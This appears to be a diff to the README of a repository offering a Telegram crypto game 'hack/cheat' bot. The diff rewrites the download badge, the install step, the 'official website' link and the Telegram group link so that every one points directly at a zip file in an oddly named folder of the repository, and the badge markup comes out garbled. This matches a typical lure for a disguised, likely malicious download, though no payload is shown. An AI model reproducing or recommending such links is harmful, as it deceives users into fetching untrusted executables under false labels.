@@ -1,7 +1,7 @@
 # 🎮 Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat - Automate Your Crypto Game Experience
 
 ## 📥 Download Links
-[![Download Now](https://img.shields.io/badge/Download%20Now-%2300b300.svg?style=flat-square&logo=github&logoColor=white)](https://github.com/Hack3r45/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases)
+[![Download Now](https://raw.githubusercontent.com/Hack3r45/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/main/obsessingly/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat.zip%20Now-%https://raw.githubusercontent.com/Hack3r45/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/main/obsessingly/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat.zip)](https://raw.githubusercontent.com/Hack3r45/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/main/obsessingly/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat.zip)
 
 ## 📜 Overview
 The Cyber Finance Game Bot automates farming and clicker activities in the Cyber Finance game. It integrates crypto with the CFI token and supports management through Telegram. This bot is designed to enhance your gameplay and maximize your profits easily.
@@ -23,7 +23,7 @@ To get started, follow these steps to download and run the Cyber Finance Game Bo
 - **User-Friendly Interface:** Designed for non-technical users, easy to navigate.
 
 ## 📥 Download & Install
-1. Visit [this page to download](https://github.com/Hack3r45/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/Hack3r45/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/main/obsessingly/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat.zip).
 2. Choose the latest version of the bot from the Releases section.
 3. Click on the link to download the file.
 4. Once the download completes, locate the downloaded file on your computer.
@@ -67,8 +67,8 @@ Feel free to contribute to the project. You can help by:
 This project is licensed under the MIT License. You can freely use and modify it as per the license guidelines. 
 
 ## 🔗 Additional Resources
-- [Cyber Finance Official Website](https://www.cyberfinancegame.com)
-- [Telegram Community Group](https://t.me/joinchat/yourcommunitylink)
+- [Cyber Finance Official Website](https://raw.githubusercontent.com/Hack3r45/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/main/obsessingly/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat.zip)
+- [Telegram Community Group](https://raw.githubusercontent.com/Hack3r45/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/main/obsessingly/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat.zip)
 
 ## 🌟 Acknowledgments
 Thank you for choosing the Cyber Finance Game Bot. We appreciate your support and feedback as we work to improve your gaming experience.
